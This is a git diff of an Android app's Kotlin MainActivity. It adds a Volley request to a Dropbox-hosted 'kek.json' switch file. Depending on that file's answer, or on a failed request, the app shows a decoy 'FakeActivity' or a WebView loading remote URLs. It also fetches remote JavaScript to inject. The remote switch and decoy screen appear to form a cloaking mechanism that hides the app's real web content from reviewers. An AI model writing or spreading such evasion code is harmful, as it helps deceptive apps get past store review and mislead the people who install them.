@@ -23,6 +23,8 @@ import android.webkit.*
 import android.widget.ProgressBar
 import androidx.appcompat.app.AppCompatActivity
 import bolts.AppLinks
+import com.android.volley.toolbox.StringRequest
+import com.android.volley.toolbox.Volley
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.appsflyer.AppsFlyerLibCore
@@ -53,6 +55,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     private lateinit var progressBar: ProgressBar
     private var script : String = ""
 
+    private var goNext = true
     private var isConnected                                   = true
     private lateinit var webView: WebView
     private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
@@ -86,7 +89,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
         private const val INPUT_FILE_REQUEST_CODE = 1
     }
 
-    override fun onCreate(savedInstanceState: Bundle?)                                         {
+    override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         progressBar = findViewById(R.id.progressBar)
@@ -98,24 +101,42 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
                 async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
 
             script = scriptTask.await()
-//        }
-//        GlobalScope.launch(Dispatchers.Main) {
-            val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"
-            val switcher = withContext(Dispatchers.IO) { URL(switcherUrl).readText(Charsets.UTF_8) }
-            if (!switcher.isBlank()) {
-                Log.d(TAG, "text $switcher")
-                if (switcher != "true") {
+        }
+
+        val queue = Volley.newRequestQueue(this@MainActivity)
+
+        val stringRequest = StringRequest(
+            com.android.volley.Request.Method.GET,
+            "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0",
+            { response ->
+                if (response.toString() == "true") {
                     progressBar.visibility = ProgressBar.GONE
                     startActivity(Intent(this@MainActivity, FakeActivity::class.java))
                     finish()
-                    return@launch
+                    return@StringRequest
+
                 }
-            }
-        }
+            },
+            {progressBar.visibility = ProgressBar.GONE
+                startActivity(Intent(this@MainActivity, FakeActivity::class.java))
+                finish()
+                return@StringRequest})
+        queue.add(stringRequest)
+
+//            val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"
+//            val switcherTask = async(Dispatchers.IO) { URL(switcherUrl).readText(Charsets.UTF_8) }
+//            val switcher = switcherTask.await()
+//            Log.d(TAG, "switcher $switcher")
+//            if (!switcher.isBlank()) {
+//                Log.d(TAG, "text $switcher")
+//                if (switcher == "true") {
+//                    goNext = false
+//
+//                }
+
         FacebookSdk.setApplicationId("293366948652919")
 
 
-        initWebView()
         initOkHttpClient()
         initSDK()
 
@@ -159,7 +180,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
         }
         val deque: Deque<String> = LinkedList()
         Log.d(TAG, deque.isNotEmpty().toString() + "(*-*)")
-        if (backDeque.isNotEmpty()) {
+        if (backDeque.isNotEmpty() && goNext) {
 
             initWebView()
             startWebView(backDeque.first)
@@ -326,7 +347,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     }
 
     webView = findViewById(R.id.webView)
-    webView.visibility = WebView.GONE
+//    webView.visibility = WebView.GONE
 
     webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
     webView?.settings?.loadWithOverviewMode = true
@@ -345,9 +366,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     webView?.settings?.mediaPlaybackRequiresUserGesture = true
 }
     private fun startWebView(startUrl:String)                                                  {
-        webView.visibility = WebView.VISIBLE
         webView?.loadUrl(startUrl)
-
+        Log.d(TAG, "Start $startUrl")
         webView?.setNetworkAvailable(isConnected)
 
         val cookieManager = CookieManager.getInstance()
@@ -389,6 +409,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
                 return false
             }
         }
+        webView.visibility = WebView.VISIBLE
+
     }
     private fun toScroll(flag: Boolean)                                                        {
         if (flag){
